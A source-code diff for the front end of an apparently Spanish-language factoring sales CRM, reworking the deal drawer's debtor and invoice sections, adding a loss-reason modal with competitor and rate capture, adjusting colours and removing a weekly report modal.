+                                            <span>Otras facturas de este deudor ({otras.length}) · {fmtMM(tot)}</span>
+                                            {ab ? <ChevronUp size={13} /> : <ChevronDown size={13} />}
+                                          </button>
+                                          {ab && <div className="mt-1">{headOtra}{otras.slice(0, 12).map(filaOtraD)}{otras.length > 12 && <div className="pt-1 t9" style={{ color: C.faint }}>y {otras.length - 12} más en «Deudores disponibles».</div>}</div>}
+                                        </div>
+                                      );
+                                    })()}</div></div>}
                                   </div>
                                 ); })}
                                 {deudOf.length > 0 && (
@@ -5505,15 +6980,29 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                                 )}
                               </div>
                             </div>
-                            <div className="mt-4 rounded-lg p-2.5" style={{ backgroundColor: "#fff", border: `1px dashed #F97316` }}>
-                              <div className="t10 font-semibold uppercase tracking-wide" style={{ color: "#C2410C" }}>Otras facturas disponibles ({dq ? `${deudOtF.length} de ${deudOt.length}` : deudOt.length} deudor(es))</div>
-                              <div className="mt-0.5 t9" style={{ color: C.faint }}>Deudores con facturas del cliente que aún NO son parte de la oferta. Agrega una factura y su deudor pasará arriba; si retiras todas las de un deudor, su acordeón vuelve aquí.</div>
-                              <div className="mt-1.5">
+                            <div className="mt-4">
+                              <button onClick={() => setOtrasAbierto((v) => !v)} className="flex w-full items-center justify-between gap-2 text-left">
+                                {/* Mismo encabezado que la oferta —titulo + deudores/facturas/monto—: son
+                                    las dos mitades de la misma decision y antes se leian con dos formatos
+                                    distintos, uno con el conteo entre parentesis y otro con chips. */}
+                                <span className="flex flex-wrap items-center gap-2">
+                                  <span className="t10 font-semibold uppercase tracking-wide" style={{ color: C.faint }}>Deudores disponibles</span>
+                                  <span className="inline-flex items-center rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: "#F5F4F8", color: C.sub, border: `1px solid ${C.line}` }}
+                                    title="Deudores con facturas que aún no están en la oferta">{dq ? `${deudOtF.length} de ${deudOtVis.length}` : deudOtVis.length} deudor{!dq && deudOtVis.length === 1 ? "" : "es"}</span>
+                                  <span className="inline-flex items-center rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: "#F5F4F8", color: C.sub, border: `1px solid ${C.line}` }}
+                                    title="Facturas disponibles para incorporar a la oferta">{facsOt} factura{facsOt === 1 ? "" : "s"}</span>
+                                  <span className="inline-flex items-center rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: C.lilac, color: C.indigo }}
+                                    title="Monto disponible para incorporar a la oferta">{fmtMM(montoOt)}</span>
+                                </span>
+                                <span style={{ color: C.indigo }}>{otrasAbierto ? <ChevronUp size={14} /> : <ChevronDown size={14} />}</span>
+                              </button>
+                              {otrasAbierto && <div className="mt-1.5 rounded-xl p-2.5" style={{ backgroundColor: C.lilac }}>
+                              <div className="mb-1.5 t9" style={{ color: C.sub }}>Deudores con facturas del cliente que aún NO son parte de la oferta. Agrega una factura y su deudor pasará arriba; si retiras todas las de un deudor, su acordeón vuelve aquí.</div>
                                 {deudOtF.length === 0 && <div className="t10 py-2" style={{ color: C.faint }}>{dq ? `Sin otras facturas que coincidan con «${detQuery}».` : "No hay otras facturas disponibles."}</div>}
                                 {deudOtPage.map((dn) => { const grupo = grpOt[dn]; const abierto = detOpen["ot:" + dn] === true; return (
                                   <div key={dn} className="mb-2" style={{ border: "1px solid #E4E2EC", borderRadius: 12, overflow: "hidden", backgroundColor: "#F5F4F8" }}>
-                                    <button onClick={() => setDetOpen((m) => ({ ...m, ["ot:" + dn]: !abierto }))} className="block w-full text-left">{cabDeudor(dn, grupo, abierto)}</button>
-                                    {abierto && <div className="overflow-x-auto" style={{ backgroundColor: "#FCFCFD", borderTop: `1px solid ${C.line}`, padding: "4px 14px 8px" }}><div style={{ minWidth: 620 }}>{headOtra}{grupo.map(filaOtraD)}</div></div>}
+                                    <button onClick={() => setDetOpen((m) => ({ ...m, ["ot:" + dn]: !abierto }))} className="block w-full text-left">{cabDeudor(dn, grupo, abierto, false)}</button>
+                                    {abierto && <div className="overflow-x-auto" style={{ backgroundColor: "#FCFCFD", borderTop: `1px solid ${C.line}`, padding: "4px 14px 8px" }}><div style={{ minWidth: 760 }}>{headOtra}{grupo.map(filaOtraD)}</div></div>}
                                   </div>
                                 ); })}
                                 {otTotalPg > 1 && (
@@ -5524,7 +7013,7 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                                     <button onClick={() => setDetOtrasPage(Math.min(otTotalPg - 1, otPg + 1))} disabled={otPg >= otTotalPg - 1} title="Siguiente" className="disabled:opacity-30" style={{ color: "#C2410C" }}><ChevronRight size={14} /></button>
                                   </div>
                                 )}
-                              </div>
+                              </div>}
                             </div>
                           </>
                         );
@@ -5541,17 +7030,15 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                           <button onClick={() => onReject(deal.id)} className="mt-1.5 rounded-md px-3 py-1.5 t10 font-medium text-white" style={{ backgroundColor: C.red }}>Cerrar oportunidad</button>
                         </div>
                       ) : (() => {
-                        const botonEnviado = (deal.waSesion || []).some((m) => m.tipo === "boton");
                         const cerrada = !!(deal.ofertaCerrada || deal.negocioNum);
                         // "Comunicada" = el ejecutivo ya envió la oferta por un canal (o el Agente IA la publicó).
                         const comunicada = !!deal.ofertaComunicada || (deal.waSesion || []).some((m) => /Oferta de factoring/i.test(m.text || ""));
-                        if (!cerrada) return (
-                          <div className="mt-2">
-                            <button onClick={intentarCerrar} className="flex items-center gap-1 rounded-md px-3 py-1.5 t10 font-semibold text-white" style={{ backgroundColor: C.green }}><Check size={12} /> Cerrar oferta y crear negocio</button>
-                            <div className="mt-1.5 rounded-lg p-2.5 t9" style={{ backgroundColor: C.amberBg, border: "1px solid #FED7AA", color: "#C2410C" }}>Confirma la selección de facturas acordada con el cliente. Al cerrar la oferta se <b>crea el N° de negocio</b>; luego eliges el canal (WhatsApp / Email) para comunicársela.</div>
-                            {deal.ofertaSolicitada && <div className="mt-1.5 flex items-center gap-1.5 t9 font-semibold" style={{ color: "#DC2626" }}><MessageSquare size={11} /> El cliente ya pidió la oferta por WhatsApp · revisa y ciérrala para poder enviársela.</div>}
-                          </div>
-                        );
+                        // Cerrar la oferta se hace desde el menú de «Cerrar oferta y publicar», arriba en la
+                        // tarjeta de veredicto. Acá abajo el botón repetía la misma acción al final de una
+                        // página larga; queda sólo el aviso, que es información y no una acción.
+                        if (!cerrada) return deal.ofertaSolicitada ? (
+                          <div className="mt-2 flex items-center gap-1.5 t9 font-semibold" style={{ color: "#EF4444" }}><MessageSquare size={11} /> El cliente ya pidió la oferta por WhatsApp · revisa la selección y ciérrala desde «Cerrar oferta y publicar» para poder enviársela.</div>
+                        ) : null;
                         return (
                           <div className="mt-2">
                             <div className="mb-1.5 inline-flex items-center gap-1 rounded-full px-2 py-0.5 t9 font-semibold" style={{ backgroundColor: C.greenBg, color: "#16A34A", border: "1px solid #bbf7d0" }}><Check size={11} /> Oferta publicada{deal.negocioNum ? ` · N° ${deal.negocioNum}` : ""}</div>
@@ -5776,7 +7263,7 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                 {subCanal === "WhatsApp" && wa && (<>
                 <div className="flex items-center justify-between">
                   <div className="t11 font-semibold uppercase tracking-wide" style={{ color: C.sub }}>Sesión de WhatsApp <span className="t9 font-normal" style={{ color: C.faint }}>(única conversación activa)</span></div>
-                  <a href={waHrefDe(deal)} target="_blank" rel="opener" className="flex items-center gap-1 rounded-md px-2 py-1 t10 font-semibold" style={{ backgroundColor: "#25D366", color: "#fff", textDecoration: "none" }}><ArrowUpRight size={12} /> WhatsApp del cliente</a>
+                  <a href={waHrefDe(deal)} target="_blank" rel="noopener noreferrer" className="flex items-center gap-1 rounded-md px-2 py-1 t10 font-semibold" style={{ backgroundColor: "#25D366", color: "#fff", textDecoration: "none" }}><ArrowUpRight size={12} /> WhatsApp del cliente</a>
                 </div>
                 <div className="mt-1.5 space-y-1.5 rounded-lg p-2" style={{ backgroundColor: "#ece5dd" }}>
                   {wa.map((m, i) => {
@@ -5796,7 +7283,7 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                             </>
                           )}
                           <div className="mt-0.5 flex items-center justify-end gap-1 t8" style={{ color: C.faint }}>
-                            {mine && m.estado && (<span title={m.estado === "read" ? "Leído por el cliente" : m.estado === "delivered" ? "Entregado al teléfono (no leído aún)" : m.estado === "fallido" ? "No entregado · el teléfono no recibió el mensaje (número errado)" : m.estado === "sent" ? "Enviado al servidor (aún no entregado)" : "Pendiente de envío"} style={{ color: m.estado === "read" ? "#34b7f1" : m.estado === "fallido" ? "#DC2626" : C.faint, fontWeight: 700 }}>{m.estado === "reloj" ? "🕐" : m.estado === "fallido" ? "⚠ no entregado" : m.estado === "sent" ? "✓" : "✓✓"}</span>)}
+                            {mine && m.estado && (<span title={m.estado === "read" ? "Leído por el cliente" : m.estado === "delivered" ? "Entregado al teléfono (no leído aún)" : m.estado === "fallido" ? "No entregado · el teléfono no recibió el mensaje (número errado)" : m.estado === "sent" ? "Enviado al servidor (aún no entregado)" : "Pendiente de envío"} style={{ color: m.estado === "read" ? "#34b7f1" : m.estado === "fallido" ? "#EF4444" : C.faint, fontWeight: 700 }}>{m.estado === "reloj" ? "🕐" : m.estado === "fallido" ? "⚠ no entregado" : m.estado === "sent" ? "✓" : "✓✓"}</span>)}
                             {m.time && <span>{fmtStamp(m.time)}</span>}
                           </div>
                         </div>
@@ -6018,6 +7505,78 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
         etiquetaConfirmar="Retirar factura"
         onConfirmar={() => { onRetirarFactura(deal.id, confirmRetiro); setReevalPend(true); setConfirmRetiro(null); }}
         onCancelar={() => setConfirmRetiro(null)} />
+      {/* Motivo de cierre. Cada opción deja un resultado distinto (Perdida / Expirada) y queda en
+          la bitácora, así que se elige acá y no al vuelo dentro del menú de acciones. */}
+      {rechazoModal && (
+        <div className="fixed inset-0 flex items-center justify-center ovl" style={{ zIndex: 70 }} onClick={() => { setRechazoModal(false); setRechComp({ paso: false, quien: "", query: "", tasa: "" }); }}>
+          <div onClick={(e) => e.stopPropagation()} className="w-full rounded-2xl bg-white p-5 shadow-2xl" style={{ maxWidth: 460 }}>
+            <div className="t15 font-bold" style={{ color: C.ink }}>¿Por qué se pierde esta operación?</div>
+            <div className="mt-1 t10" style={{ color: C.sub }}>{deal.cliente} · {deal.id}. El motivo queda en la bitácora y define si la oportunidad se marca como perdida o expirada.</div>
+            {!rechComp.paso ? (<>
+              {/* «Caducada por inactividad» no se ofrece: ese desenlace lo asigna el sistema cuando la
+                  oportunidad se queda sin movimiento, no lo elige el ejecutivo. */}
+              <div className="mt-3 flex flex-col gap-1">
+                {CLOSE_REASONS.filter((r) => r.k !== "grant_block" && r.k !== "inactivity").map((r) => (
+                  <button key={r.k} onClick={() => { if (r.k === "competitor") { setRechComp({ paso: true, quien: "", query: "", tasa: "" }); return; } setRechazoModal(false); onReject(deal.id, r.k); }}
+                    className="flex w-full items-center justify-between gap-2 rounded-lg px-3 py-2 t11 text-left hover:bg-stone-50" style={{ border: `1px solid ${C.line}`, color: C.ink }}>
+                    <span>{r.label}</span>
+                    {r.k === "competitor"
+                      ? <ChevronRight size={14} style={{ color: C.faint }} />
+                      : <span className="shrink-0 rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: RESULT_COL[r.result].bg, color: RESULT_COL[r.result].fg }}>{RESULT_LBL[r.result]}</span>}
+                  </button>
+                ))}
+              </div>
+              <div className="mt-4 flex justify-end">
+                <button onClick={() => setRechazoModal(false)} className="rounded-full px-4 py-1.5 t11 font-semibold" style={{ border: `1px solid ${C.line}`, color: C.sub, backgroundColor: "#fff" }}>Cancelar</button>
+              </div>
+            </>) : (<>
+              {/* Contra quién y a qué tasa: sin ese par la pérdida no sirve para nada, porque es
+                  justamente lo que alimenta la comparación de precio contra la competencia. */}
+              <div className="mt-3 t10 font-semibold uppercase tracking-wide" style={{ color: C.faint }}>¿A qué factoring se cedió?</div>
+              <div className="mt-1.5 flex items-center gap-1.5 rounded-full px-2.5 py-1.5" style={{ border: `1px solid ${C.line}` }}>
+                <Search size={12} style={{ color: C.faint }} />
+                <input autoFocus value={rechComp.query} onChange={(e) => setRechComp((v) => ({ ...v, query: e.target.value }))} placeholder="Buscar factoring…" className="w-full bg-transparent t11 outline-none" style={{ color: C.ink }} />
+              </div>
+              <div className="mt-1.5 flex flex-col gap-1 overflow-y-auto" style={{ maxHeight: 190 }}>
+                {COMPETIDORES_FACTORING.filter((n) => n.toLowerCase().includes(rechComp.query.trim().toLowerCase())).map((n) => {
+                  const sel = rechComp.quien === n;
+                  return (
+                    <button key={n} onClick={() => setRechComp((v) => ({ ...v, quien: n }))} className="flex w-full items-center justify-between gap-2 rounded-lg px-3 py-2 t11 text-left" style={{ border: `1px solid ${sel ? C.indigo : C.line}`, backgroundColor: sel ? C.lilac : "#fff", color: sel ? C.indigo : C.ink, fontWeight: sel ? 600 : 400 }}>
+                      <span>{n}</span>{sel && <Check size={13} />}
+                    </button>
+                  );
+                })}
+                {COMPETIDORES_FACTORING.filter((n) => n.toLowerCase().includes(rechComp.query.trim().toLowerCase())).length === 0 && (
+                  <div className="py-2 t10" style={{ color: C.faint }}>Ningún factoring coincide con «{rechComp.query}».</div>
+                )}
+              </div>
+              <div className="mt-3 flex items-center justify-between gap-3">
+                <span className="t11" style={{ color: C.ink }}>Tasa de cierre</span>
+                <span className="flex items-center gap-1.5">
+                  <input type="number" step="0.01" value={rechComp.tasa} onChange={(e) => setRechComp((v) => ({ ...v, tasa: e.target.value }))} placeholder="0,00" className="w-24 rounded-md px-2 py-1 t11 text-right outline-none" style={{ border: `1px solid ${C.line}`, color: C.ink }} />
+                  <span className="t11" style={{ color: C.sub }}>%</span>
+                </span>
+              </div>
+              <div className="mt-4 flex items-center justify-between gap-2">
+                <button onClick={() => setRechComp({ paso: false, quien: "", query: "", tasa: "" })} className="rounded-full px-4 py-1.5 t11 font-semibold" style={{ border: `1px solid ${C.line}`, color: C.sub, backgroundColor: "#fff" }}>‹ Volver</button>
+                <button onClick={() => { setRechazoModal(false); onReject(deal.id, "competitor", { competidor: rechComp.quien, tasaCierre: rechComp.tasa }); setRechComp({ paso: false, quien: "", query: "", tasa: "" }); }}
+                  disabled={!rechComp.quien || !(+rechComp.tasa > 0)} title={!rechComp.quien ? "Elige contra qué factoring se perdió" : !(+rechComp.tasa > 0) ? "Ingresa la tasa de cierre" : undefined}
+                  className="rounded-full px-4 py-1.5 t11 font-semibold text-white disabled:opacity-40 disabled:cursor-not-allowed" style={{ backgroundColor: C.red }}>Marcar como perdida</button>
+              </div>
+            </>)}
+          </div>
+        </div>
+      )}
+      {/* Confirmación del curse: las dos cifras de línea y los cuatro bloques de acciones. */}
+      <ModalCurse deal={deal} datos={cursarModal} sinComentario={cursarModal ? excepcionesSinComentario(deal).length : 0}
+        onCancelar={() => setCursarModal(null)}
+        onConfirmar={() => {
+          const e = cursarModal.evalLin;
+          if (e.requiereComite > 0) logSys("info", "linea", `Solicitud de línea al comité · negocio ${deal.id} · ${fmtMM(e.requiereComite)} en ${e.solicitudes.length} línea(s) de detalle`, { empresa: deal.cliente, monto: e.requiereComite });
+          logSys("info", "linea", `Asignaciones de línea aprobadas · ${fmtMM(e.cursable)} sobre ${e.facturas.filter((f) => f.estado === "CON_LINEA").length} factura(s)`, { empresa: deal.cliente, monto: e.cursable });
+          setCursarModal(null);
+          intentarCerrar();
+        }} />
       {/* Advertencia al pre-evaluar: excepciones pendientes sin comentario/respaldo del ejecutivo. */}
       {preEvalWarn && (
         <div className="fixed inset-0 z-50 flex items-center justify-center ovl p-6" onClick={() => setPreEvalWarn(null)}>
@@ -6058,11 +7617,13 @@ function sowEstrategia(ev) {
   if (!t && act == null && !ev.superaTarget) return null; // sin información de SOW
   let sm;
   if (ev.superaTarget) sm = { Icon: Check, bg: "#F0FDF4", fg: "#16A34A", lab: "en target", desc: "La participación de Security está en o sobre el objetivo.", estr: "Defender la cuenta; tasa estándar (no se requiere descuento)." };
-  else if (act === 0) sm = { Icon: ArrowDownRight, bg: "#fef2f2", fg: "#DC2626", lab: "0% · en competencia", desc: "Security no tiene participación; el cliente cede sus facturas a la competencia.", estr: "Capturar SOW: oferta competitiva para arrebatar el negocio a la competencia." };
+  else if (act === 0) sm = { Icon: ArrowDownRight, bg: "#fef2f2", fg: "#EF4444", lab: "0% · en competencia", desc: "Security no tiene participación; el cliente cede sus facturas a la competencia.", estr: "Capturar SOW: oferta competitiva para arrebatar el negocio a la competencia." };
   else if (t === "Creciendo") sm = { Icon: ArrowUpRight, bg: "#F0FDF4", fg: "#16A34A", lab: "creciendo", desc: "Security está ganando participación en este cliente.", estr: "Mantener el servicio; descuento mínimo." };
-  else if (t === "Decreciente") sm = { Icon: ArrowDownRight, bg: "#fef2f2", fg: "#DC2626", lab: "bajando", desc: "Security está perdiendo participación frente a la competencia.", estr: "Oferta con descuento promocional para recuperar el SOW." };
+  else if (t === "Decreciente") sm = { Icon: ArrowDownRight, bg: "#fef2f2", fg: "#EF4444", lab: "bajando", desc: "Security está perdiendo participación frente a la competencia.", estr: "Oferta con descuento promocional para recuperar el SOW." };
   else if (t === "Nuevo") sm = { Icon: Sparkles, bg: "#eff6ff", fg: "#2563EB", lab: "nuevo", desc: "Cliente nuevo, sin historial de factoring con Security ni con la competencia.", estr: "Captar la primera operación para abrir la relación." };
-  else sm = { Icon: ArrowRight, bg: "#FFF7ED", fg: "#C2410C", lab: "estable", desc: "Participación estable, pero por debajo del objetivo.", estr: "Descuento moderado para capturar más participación." };
+  // Estable va en morado y no en naranja: el naranja de la paleta señala urgencia («facturas nuevas»,
+  // alertas de plazo) y un SOW estable no la tiene —está bajo el objetivo, pero no se está cayendo.
+  else sm = { Icon: ArrowRight, bg: "#f5f3ff", fg: "#7C3AED", lab: "estable", desc: "Participación estable, pero por debajo del objetivo.", estr: "Descuento moderado para capturar más participación." };
   const nums = (act != null && ev.sowTargetPct != null) ? `SOW actual ${Math.round(act)}% · target ${Math.round(ev.sowTargetPct)}%${ev.sowGapPct ? ` · brecha ${ev.sowGapPct} pts` : ""}\n` : (act === 0 ? "SOW actual 0% (todo en la competencia)\n" : "");
   const tip = `Share of Wallet — ${sm.lab}\n${nums}${sm.desc}\nEstrategia comercial: ${sm.estr}`;
   return { ...sm, act, tip };
@@ -6406,7 +7967,7 @@ const REPORTE_METRICAS = [
   { key: "prospeccion", label: "Prospección", color: "#9CA3AF" },
   { key: "curse", label: "Curse", color: "#C2410C" },
   { key: "giro", label: "Girada", color: "#16a34a" },
-  { key: "perdida", label: "Pérdida", color: "#dc2626" },
+  { key: "perdida", label: "Pérdida", color: "#EF4444" },
 ];
 function DiaModal({ info, ultimo, reporte, deals = [], onAceptar, onClose, inline, execFijo = null }) {
   const s = info.stats;
@@ -6631,247 +8192,6 @@ function PerfilDetalle({ empresas }) {
     </div>
   );
 }
-function ReporteModal({ reporte, analisis, onClose, onRecomendar }) {
-  const [tab, setTab] = useState("resumen");
-  const [verPerfil, setVerPerfil] = useState({}); // patrones expandidos (botón "Ver")
-  const [verRegla, setVerRegla] = useState({}); // reglas con su lista de empresas expandida
-  const max = Math.max(1, ...reporte.flatMap((d) => REPORTE_METRICAS.map((m) => d[m.key] || 0)));
-  const W = 680, H = 230, padX = 36, padY = 24, innerH = H - padY * 2;
-  const gw = (W - padX * 2) / Math.max(1, reporte.length);
-  const bw = (gw * 0.8) / REPORTE_METRICAS.length;
-  return (
-    <>
-      <div className="fixed inset-0 z-40 ovl no-print" onClick={onClose} />
-      <div className="fixed inset-0 z-50 flex items-center justify-center p-4" onClick={onClose}>
-        <div onClick={(e) => e.stopPropagation()} className="print-area w-full rounded-xl bg-white p-5 shadow-2xl" style={{ maxWidth: "1180px", maxHeight: "90vh", overflowY: "auto", border: `1px solid ${C.line}` }}>
-          <div className="flex items-center justify-between">
-            <div className="text-lg font-semibold" style={{ color: C.ink }}>Reporte semanal · prospección, originación, curse, giro y pérdida</div>
-            <div className="no-print flex items-center gap-2">
-              <button onClick={() => window.print()} className="flex items-center gap-1.5 rounded-lg px-3 py-1.5 t12 font-medium text-white" style={{ backgroundColor: C.indigo }}><Download size={14} /> Exportar PDF</button>
-              <button onClick={onClose} className="rounded-md p-1 hover:bg-stone-100"><X size={18} style={{ color: C.sub }} /></button>
-            </div>
-          </div>
-          <div className="no-print mt-2 flex gap-1.5">
-            {[["resumen", "Resumen"], ["cobranza", "Cobranza"]].map(([k, lbl]) => (
-              <button key={k} onClick={() => setTab(k)} className="rounded-md px-3 py-1 t11 font-medium" style={{ backgroundColor: tab === k ? C.lilac : "#fff", color: tab === k ? C.indigo : C.sub, border: `1px solid ${tab === k ? C.indigo : C.line}` }}>{lbl}</button>
-            ))}
-          </div>
-          {tab === "resumen" && (<>
-          <div className="mt-2 flex flex-wrap gap-3">
-            {REPORTE_METRICAS.map((m) => (
-              <span key={m.key} className="flex items-center gap-1 t10" style={{ color: C.sub }}><span className="h-2 w-2 rounded-full" style={{ backgroundColor: m.color }} />{m.label}</span>
-            ))}
-          </div>
-          <svg viewBox={`0 0 ${W} ${H}`} className="mt-3 w-full">
-            <line x1={padX} y1={H - padY} x2={W - padX} y2={H - padY} stroke="#E5E7EB" />
-            {reporte.map((d, di) => REPORTE_METRICAS.map((m, mi) => {
-              const bh = ((d[m.key] || 0) / max) * innerH;
-              return <rect key={`${di}-${mi}`} x={padX + di * gw + mi * bw + gw * 0.1} y={H - padY - bh} width={Math.max(1, bw - 1)} height={bh} fill={m.color} rx="1" />;
-            }))}
-            {reporte.map((d, di) => (
-              <text key={di} x={padX + di * gw + gw / 2} y={H - padY + 14} textAnchor="middle" fontSize="10" fill="#9CA3AF">Día {d.dia}</text>
-            ))}
-          </svg>
-
-          {/* Evolución Win Rate / Loss Rate */}
-          {(() => {
-            const dias = reporte.map((d) => { const e = d.embudo || {}; const w = e.aceptadas || 0, l = e.perdida || 0, t = w + l; return { dia: d.dia, wr: t ? Math.round(w / t * 100) : 0, lr: t ? Math.round(l / t * 100) : 0 }; });
-            if (dias.length === 0) return null;
-            const w2 = 680, h2 = 150, px = 30, py = 18, ih = h2 - py * 2, n = dias.length;
-            const xx = (i) => (n > 1 ? px + i * (w2 - px * 2) / (n - 1) : w2 / 2);
-            const yy = (v) => h2 - py - (v / 100) * ih;
-            const path = (key) => dias.map((d, i) => `${i ? "L" : "M"}${xx(i).toFixed(1)},${yy(d[key]).toFixed(1)}`).join(" ");
-            return (
-              <>
-                <div className="mt-4 t11 font-semibold uppercase tracking-wide" style={{ color: C.sub }}>Evolución Win Rate / Loss Rate</div>
-                <div className="mt-1 flex gap-3 t10" style={{ color: C.sub }}>
-                  <span className="flex items-center gap-1"><span className="h-2 w-2 rounded-full" style={{ backgroundColor: C.green }} />Win Rate</span>
-                  <span className="flex items-center gap-1"><span className="h-2 w-2 rounded-full" style={{ backgroundColor: C.red }} />Loss Rate</span>
-                </div>
-                <svg viewBox={`0 0 ${w2} ${h2}`} className="mt-1 w-full">
-                  {[0, 25, 50, 75, 100].map((g) => (<g key={g}><line x1={px} y1={yy(g)} x2={w2 - px} y2={yy(g)} stroke="#E5E7EB" /><text x={px - 4} y={yy(g) + 3} textAnchor="end" fontSize="9" fill="#9CA3AF">{g}%</text></g>))}
-                  <path d={path("wr")} fill="none" stroke={C.green} strokeWidth="2" />
-                  <path d={path("lr")} fill="none" stroke={C.red} strokeWidth="2" />
-                  {dias.map((d, i) => (<g key={i}><circle cx={xx(i)} cy={yy(d.wr)} r="2.5" fill={C.green} /><circle cx={xx(i)} cy={yy(d.lr)} r="2.5" fill={C.red} /><text x={xx(i)} y={h2 - py + 13} textAnchor="middle" fontSize="9" fill="#9CA3AF">D{d.dia}</text></g>))}
-                </svg>
-              </>
-            );
-          })()}
-
-          {/* Embudo del pipeline (semana, acumulado) */}
-          {(() => {
-            const agg = { inbound: 0, prospeccion: 0, oferta: 0, aceptadas: 0, cesion: 0, giro: 0, perdida: 0 };
-            reporte.forEach((d) => { const e = d.embudo || {}; Object.keys(agg).forEach((k) => (agg[k] += e[k] || 0)); });
-            const fdata = [
-              { label: "Inbound", v: agg.inbound, color: "#8A63FF" }, { label: "Prospección", v: agg.prospeccion, color: "#9CA3AF" },
-              { label: "Oferta", v: agg.oferta, color: "#C2410C" }, { label: "Aceptadas", v: agg.aceptadas, color: "#0ea5e9" },
-              { label: "Cesión", v: agg.cesion, color: "#14b8a6" }, { label: "Girada", v: agg.giro, color: "#16a34a" },
-            ];
-            const fmax = Math.max(1, ...fdata.map((d) => d.v)), top = fdata[0].v || 0;
-            return (
-              <>
-                <div className="mt-4 t11 font-semibold uppercase tracking-wide" style={{ color: C.sub }}>Embudo del pipeline (semana) · oportunidades que pasaron por cada etapa</div>
-                <div className="mt-1.5 space-y-1">
-                  {fdata.map((d, i) => (
-                    <div key={d.label} className="flex items-center gap-2">
-                      <span className="w-20 t10 text-right" style={{ color: C.sub }}>{d.label}</span>
-                      <div className="flex-1"><div className="mx-auto flex items-center justify-center rounded t10 font-semibold text-white" style={{ width: `${Math.max(8, (d.v / fmax) * 100)}%`, backgroundColor: d.color, height: "18px" }}>{d.v}</div></div>
-                      <span className="w-10 t9 text-right" style={{ color: C.faint }}>{i === 0 ? 100 : top ? Math.round(d.v / top * 100) : 0}%</span>
-                    </div>
-                  ))}
-                  <div className="flex items-center gap-2 pt-0.5">
-                    <span className="w-20 t10 text-right" style={{ color: C.red }}>Pérdida</span>
-                    <div className="flex-1"><div className="flex items-center justify-center rounded t10 font-semibold text-white" style={{ width: `${Math.max(8, (agg.perdida / fmax) * 100)}%`, backgroundColor: C.red, height: "16px" }}>{agg.perdida}</div></div>
-                    <span className="w-10" />
-                  </div>
-                </div>
-              </>
-            );
-          })()}
-
-          {analisis && (
-            <>
-              {/* Deudores recibidos: lista blanca (buenos pagadores) vs otros */}
-              {analisis.deudores && analisis.deudores.totalFac > 0 && (() => {
-                const dd = analisis.deudores;
-                const pct = (n) => dd.totalFac ? Math.round(n / dd.totalFac * 100) : 0;
-                return (
-                  <>
-                    <div className="mt-4 t11 font-semibold uppercase tracking-wide" style={{ color: C.sub }}>Deudores recibidos · lista blanca / autorizados / otros</div>
-                    <div className="mt-1.5 grid grid-cols-3 gap-2">
-                      <div className="rounded-lg p-2.5" style={{ backgroundColor: C.greenBg, border: "1px solid #bbf7d0" }}>
-                        <div className="t10 font-semibold" style={{ color: C.green }}>Lista Blanca</div>
-                        <div className="mt-0.5 t13 font-bold" style={{ color: C.ink }}>{dd.buenosFac.toLocaleString("es-CL")} fact. <span className="t10 font-normal" style={{ color: C.sub }}>({pct(dd.buenosFac)}%)</span></div>
-                        <div className="t10" style={{ color: C.sub }}>{fmtMM(dd.buenosMM)}</div>
-                      </div>
-                      <div className="rounded-lg p-2.5" style={{ backgroundColor: "#eff6ff", border: "1px solid #bfdbfe" }}>
-                        <div className="t10 font-semibold" style={{ color: "#2563EB" }}>Autorizados</div>
-                        <div className="mt-0.5 t13 font-bold" style={{ color: C.ink }}>{(dd.autorizadosFac || 0).toLocaleString("es-CL")} fact. <span className="t10 font-normal" style={{ color: C.sub }}>({pct(dd.autorizadosFac || 0)}%)</span></div>
-                        <div className="t10" style={{ color: C.sub }}>{fmtMM(dd.autorizadosMM || 0)}</div>
-                      </div>
-                      <div className="rounded-lg p-2.5" style={{ backgroundColor: "#fff7ed", border: "1px solid #fed7aa" }}>
-                        <div className="t10 font-semibold" style={{ color: "#C2410C" }}>Otros deudores</div>
-                        <div className="mt-0.5 t13 font-bold" style={{ color: C.ink }}>{dd.otrosFac.toLocaleString("es-CL")} fact. <span className="t10 font-normal" style={{ color: C.sub }}>({pct(dd.otrosFac)}%)</span></div>
-                        <div className="t10" style={{ color: C.sub }}>{fmtMM(dd.otrosMM)}</div>
-                      </div>
-                    </div>
-                    <div className="mt-1.5 flex h-2 w-full overflow-hidden rounded-full" style={{ backgroundColor: "#fed7aa" }}>
-                      <div style={{ width: `${pct(dd.buenosFac)}%`, backgroundColor: C.green }} />
-                      <div style={{ width: `${pct(dd.autorizadosFac || 0)}%`, backgroundColor: "#2563EB" }} />
-                    </div>
-                    <div className="mt-1 t9" style={{ color: C.faint }}>Total recibido: {dd.totalFac.toLocaleString("es-CL")} facturas · {fmtMM(dd.totalMM)}. Lista Blanca = buenos pagadores (menor riesgo); Autorizados = deudores aprobados; Otros = fuera de las listas.</div>
-                  </>
-                );
-              })()}
-              {/* Performance por regla */}
-              <div className="mt-4 t11 font-semibold uppercase tracking-wide" style={{ color: C.sub }}>Performance por regla</div>
-              <table className="mt-1.5 w-full border-collapse t10">
-                <thead><tr>{["Regla", "Estado", "Acción", "Capturas", "Monto", ""].map((h, hi) => (
-                  <th key={hi} className="px-2 py-1 text-left font-semibold" style={{ color: C.sub, borderBottom: `1px solid ${C.line}` }}>{h}</th>))}</tr></thead>
-                <tbody>
-                  {analisis.reglas.map((r) => (
-                    <Fragment key={r.id}>
-                      <tr style={{ borderBottom: `1px solid ${C.line}` }}>
-                        <td className="px-2 py-1" style={{ color: C.ink }}>{r.id} · {r.title}</td>
-                        <td className="px-2 py-1" style={{ color: r.activa ? C.green : C.faint }}>{r.activa ? "Activa" : "Pausada"}</td>
-                        <td className="px-2 py-1" style={{ color: C.sub }}>{r.accion}</td>
-                        <td className="px-2 py-1 text-right font-medium" style={{ color: C.ink }}>{r.count}</td>
-                        <td className="px-2 py-1 text-right" style={{ color: C.sub }}>{fmtMM(r.montoMM)}</td>
-                        <td className="px-2 py-1 text-right">
